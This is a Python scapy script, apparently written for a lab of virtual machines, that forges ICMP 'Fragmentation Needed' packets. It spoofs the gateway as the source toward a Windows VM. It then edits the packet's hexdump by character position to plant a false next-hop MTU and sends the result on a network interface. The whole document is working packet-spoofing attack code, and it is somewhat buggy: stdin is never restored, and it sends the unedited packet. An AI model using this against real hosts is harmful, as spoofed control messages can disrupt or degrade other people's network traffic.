import scapy.all as scapy
import subprocess
import sys
import contextlib
import io

def convert_hex_to_packet():
    f1 = sys.stdin
    f = open('input.txt', 'r')
    sys.stdin = f
    resturn_packet = scapy.Ether(scapy.import_hexcap())
    f.close()
    sys.stdin
    return resturn_packet

if __name__ == "__main__":
    host = '192.168.137.1'
    ubuntu_VM = '192.168.137.209'
    windows_VM = '192.168.137.67'
    gateway = '192.168.137.1'
    blackhole = '1.2.3.4'
    host_Ether = '02:00:4c:4f:4f:50'
    ubuntu_Ether = '08:00:27:e0:e3:5a'
    windows_Ether = '08:00:27:ee:16:f3'
    sip = gateway
    dip = windows_VM
    ip = scapy.IP()
    icmp = scapy.ICMP()
    ip.dst = dip
    ip.src = sip
    ip.protocol = 1 # ICMP
    icmp.type = 3 # Destination Unreachable
    # set ICMP code Fragmentation needed but DF set 4
    icmp.code = 4 # Fragmentation needed
    icmp.nexthopmtu = 0

    # Construct the Inner IP embedded into the ICMP error message to simulate
    # the packet which caused the ICMP error
    ip_orig = scapy.IP()
    # ip_orig.src = '10.10.10.2'
    # ip_orig.dst = '10.10.10.1'

    ether = scapy.Ether(src = host_Ether, dst = windows_Ether)
    # use spoofed gateway to send packet. In windows server it uses 192.168.100.1 as 
    # default gateway

    ip_orig.src = windows_VM
    ip_orig.dst = gateway
    udp_orig = scapy.UDP()
    # send packet to closed port
    udp_orig.sport = 50000
    udp_orig.dport = 50000

    udp_orig1 = scapy.UDP()
    # udp_orig1.sport = 61724
    udp_orig1.sport = 432
    udp_orig1.dport = 124 # 53 malformed


    # Send the packet to open port

    udp_orig.dport = 631
    udp_orig.sport = 88

    #
    udp_orig2 = scapy.UDP()
    udp_orig2.sport = 100
    udp_orig2.dport = 100
    # scapy.send(ip/udp_orig)
    # scapy.send(ip/udp_orig)
    # print(icmp.display())
    packet = ether/ip/icmp/ip_orig/udp_orig1
    # scapy.sendp(packet, iface = 'enp0s3') 
    capture_output = io.StringIO()

    # modify unused
    with contextlib.redirect_stdout(capture_output):
        scapy.hexdump(packet)
    capture_str = capture_output.getvalue()
    print(capture_str)
    '''
    0000  08 00 27 78 FE 4B 52 54 00 12 35 00 08 00 45 00  ..'x.KRT..5...E.
    0010  00 38 00 01 00 00 40 01 31 6D C0 A8 64 01 C0 A8  .8....@.1m..d...
    0020  64 05 03 04 40 96 00 00 05 DC 45 00 00 1C 00 01  d...@.....E.....
    0030  00 00 40 11 31 74 C0 A8 64 05 C0 A8 64 06 FC F1  ..@.1t..d...d...
    0040  00 35 00 08 B9 5A                                .5...Z
    each line 6 + 3*16 + 1 + 16 + 1(\n) = 72 characters
    target byte 00 00 loacte in index 72*2 + 6 + 3*6 = 168, 169, 171, 172 
    associate code 72*3 - 10 - 1= 205, 206

    1500 = 05(.)DC     1400 = 05(.)78(x)     1300 = 0514      1200 = 04(.)B0(°)     1000 = 03(.)E8     600 = 02(.)58
    '''
    capture_list = list(capture_str)
    print(capture_list)
    # set_mtu = input("input mtu")
    capture_list[168] = '0'
    capture_list[169] = '5'
    capture_list[171] = '1'
    capture_list[172] = '4'
    capture_list[205] = '.'
    capture_list[206] = '.'
    capture_str = ''.join(capture_list)
    print(capture_str)
    f = open('input.txt', 'w')
    f.write(capture_str)
    f.close()

    hex_packet = convert_hex_to_packet()
    # recalculatr checksum
    del hex_packet[scapy.ICMP].chksum
    hex_packet = hex_packet.__class__(bytes(hex_packet))
    hex_packet.display()
    scapy.sendp(packet, iface = "以太网 4")
    # scapy.sendp(hex_packet, iface = '以太网 4')    

